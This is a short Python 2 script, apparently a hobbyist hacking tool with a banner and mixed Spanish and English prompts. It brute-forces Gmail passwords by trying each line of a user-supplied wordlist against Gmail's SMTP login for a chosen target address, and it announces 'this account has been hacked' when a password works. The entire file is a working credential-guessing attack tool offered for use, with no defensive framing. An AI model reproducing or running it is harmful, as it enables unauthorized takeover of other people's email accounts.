  
#!/usr/bin/python
'''create by VPP Hacker'''

import smtplib
from os import system

def main():
   print """
  /$$$$$$  /$$      /$$  /$$$$$$  /$$$$$$ /$$       /$$$$$$$$ /$$$$$$$ 
 /$$__  $$| $$$    /$$$ /$$__  $$|_  $$_/| $$      | $$_____/| $$__  $$
| $$  \__/| $$$$  /$$$$| $$  \ $$  | $$  | $$      | $$      | $$  \ $$
| $$ /$$$$| $$ $$/$$ $$| $$$$$$$$  | $$  | $$      | $$$$$   | $$$$$$$ 
| $$|_  $$| $$  $$$| $$| $$__  $$  | $$  | $$      | $$__/   | $$__  $$
| $$  \ $$| $$\  $ | $$| $$  | $$  | $$  | $$      | $$      | $$  \ $$
|  $$$$$$/| $$ \/  | $$| $$  | $$ /$$$$$$| $$$$$$$$| $$      | $$$$$$$/
 \______/ |__/     |__/|__/  |__/|______/|________/|__/      |_______/ """
   print '================================================='
   print '               coded by Ceriani                  '
   print '              GMAIL Fuerza Bruta                 '
   print '================================================='

main()
print '[1] comenzando el ataque'
print '[2] salir'
option = input('Enter Option =>')
if option == 1:
   file_path = raw_input('pon el nombre de la passwordlist.txt :')
else:
   system('clear')
   exit()
pass_file = open(file_path,'r')
pass_list = pass_file.readlines()
def login():
    i = 0
    user_name = raw_input(' gmail de ataque ->')
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()
    for password in pass_list:
      i = i + 1
      print str(i) + '/' + str(len(pass_list))
      try:
         server.login(user_name, password)
         system('clear')
         main()
         print '\n'
         print '[+] this account has been hacked, password ->' + password + '     ^_^'
         break
      except smtplib.SMTPAuthenticationError as e:
         error = str(e)
         if error[14] == '<':
            system('clear')
            main()
            print '[+] this account has been hacked, password ->' + password + '     ^_^'

            break
         else:
            print '[!] password not found => ' + password
login()
